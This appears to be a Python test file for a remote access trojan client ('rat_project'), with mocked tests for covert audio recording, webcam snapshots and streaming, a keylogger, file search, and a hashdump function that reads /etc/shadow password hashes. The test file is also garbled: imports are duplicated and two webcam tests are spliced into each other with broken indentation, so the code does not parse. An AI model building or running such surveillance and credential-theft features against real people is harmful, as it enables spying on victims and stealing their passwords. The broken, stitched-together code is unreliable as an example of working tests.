import base64
from unittest.mock import patch

import numpy as np

from rat_project.client.client_actions_os import get_system_info, record_audio
from unittest.mock import MagicMock, patch

from rat_project.client.client_actions_os import get_system_info, webcam_snapshot, webcam_stream
from rat_project.client.client_actions_os import get_system_info, webcam_snapshot
from rat_project.client.client_actions_os import get_system_info, toggle_keylogger
import tempfile
from pathlib import Path

from rat_project.client.client_actions_os import get_system_info, search_file
from unittest.mock import mock_open, patch

from rat_project.client.client_actions_os import get_system_info, hashdump


def test_get_system_info_returns_string() -> None:
    result = get_system_info()

    assert isinstance(result, str)
    assert result != ""


def test_record_audio_returns_base64_string() -> None:
    """record_audio() must return a non-empty base64 string."""
    fake_frames = np.zeros((44100 * 5, 1), dtype="int16")  # 5s of silence

    with patch("sounddevice.rec", return_value=fake_frames), patch("sounddevice.wait"):
        result = record_audio(duration=5)

def test_webcam_stream_no_webcam_sends_error() -> None:
    # Given: no webcam available
    mock_conn = MagicMock()

def test_webcam_snapshot_returns_base64_string() -> None:
    # Given: a working webcam
    with patch("cv2.VideoCapture") as mock_cap_class:
        with patch("cv2.imencode") as mock_encode:
            mock_cap = MagicMock()
            mock_cap_class.return_value = mock_cap
            mock_cap.isOpened.return_value = True
            mock_cap.read.return_value = (True, MagicMock())
            mock_buf = MagicMock()
            mock_buf.tobytes.return_value = b"fake_jpeg_bytes"
            mock_encode.return_value = (True, mock_buf)
            result = webcam_snapshot()
    assert isinstance(result, str)
    assert len(result) > 0


def test_record_audio_data_is_valid_wav() -> None:
    """Decoded base64 from record_audio() must be a valid WAV file."""
    fake_frames = np.zeros((44100 * 3, 1), dtype="int16")  # 3s of silence

    with patch("sounddevice.rec", return_value=fake_frames), patch("sounddevice.wait"):
        result = record_audio(duration=3)

    wav_bytes = base64.b64decode(result)

    # WAV files start with "RIFF" and contain "WAVE" at offset 8
    assert wav_bytes[:4] == b"RIFF"
    assert wav_bytes[8:12] == b"WAVE"


def test_record_audio_default_duration_calls_correct_frames() -> None:
    """record_audio() without argument must record exactly 5 * 44100 frames."""
    fake_frames = np.zeros((44100 * 5, 1), dtype="int16")

    with patch("sounddevice.rec", return_value=fake_frames) as mock_rec, patch("sounddevice.wait"):
        record_audio()

    mock_rec.assert_called_once_with(
        44100 * 5,
        samplerate=44100,
        channels=1,
        dtype="int16",
    )
def test_webcam_snapshot_no_webcam_returns_empty_string() -> None:
    # Given: no webcam available
    with patch("cv2.VideoCapture") as mock_cap_class:
        mock_cap = MagicMock()
        mock_cap_class.return_value = mock_cap
        mock_cap.isOpened.return_value = False
        webcam_stream(mock_conn)

    # ror
    mock_conn.sendall.assert_called_once()
    sent = mock_conn.sendall.call_args[0][0].decode()
    assert "stream_error" in sent
        result = webcam_snapshot()
    assert result == ""
def test_toggle_keylogger_start_returns_confirmation() -> None:
    # Given: keylogger is not running
    import rat_project.client.client_actions_os as actions

    actions._keylogger_listener = None
    actions._keylogger_buffer = []

    with patch("pynput.keyboard.Listener") as mock_listener_class:
        mock_listener = MagicMock()
        mock_listener_class.return_value = mock_listener

        result = toggle_keylogger()

    assert "started" in result.lower()
    mock_listener.start.assert_called_once()


def test_toggle_keylogger_stop_returns_captured_keys() -> None:
    # Given: keylogger is already running with buffered keys
    import rat_project.client.client_actions_os as actions

    mock_listener = MagicMock()
    actions._keylogger_listener = mock_listener
    actions._keylogger_buffer = ["h", "e", "l", "l", "o"]

    result = toggle_keylogger()

    assert "stopped" in result.lower()
    assert "hello" in result
    mock_listener.stop.assert_called_once()
    assert actions._keylogger_listener is None
    assert actions._keylogger_buffer == []
def test_search_file_found() -> None:
    # Crée une fichier temporaire et vérifie qu'on le trouve bien
    with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as tmp:
        tmp_path = Path(tmp.name)

    result = search_file(tmp_path.name)

    assert tmp_path.name in result
    tmp_path.unlink()


def test_search_file_not_found() -> None:
    result = search_file("fichier_qui_nexiste_vraiment_pas_12345.xyz")

    assert "Aucun fichier trouvé" in result
def test_hashdump_linux_returns_shadow_content() -> None:
    # Given: Linux OS with a reeadable /etc/shadow
    fake_shadow = "root:$6$hash:19000:0:99999:7:::\nuser:$6$hash2:19000:0:99999:7:::\n"

    with patch("rat_project.client.client_actions_os._get_os", return_value="Linux"):
        with patch("builtins.open", mock_open(read_data=fake_shadow)):
            with patch("pathlib.Path.read_text", return_value=fake_shadow):
                result = hashdump()
    assert isinstance(result, str)
    assert "root" in result


def test_hashdump_linux_permission_denied_returns_error() -> None:
    # Given: Linux OS without root privileges
    with patch("rat_project.client.client_actions_os._get_os", return_value="Linux"):
        with patch("pathlib.Path.read_text", side_effect=PermissionError):
            result = hashdump()

    assert isinstance(result, str)
    assert "Error" in result
    assert "permission" in result.lower()
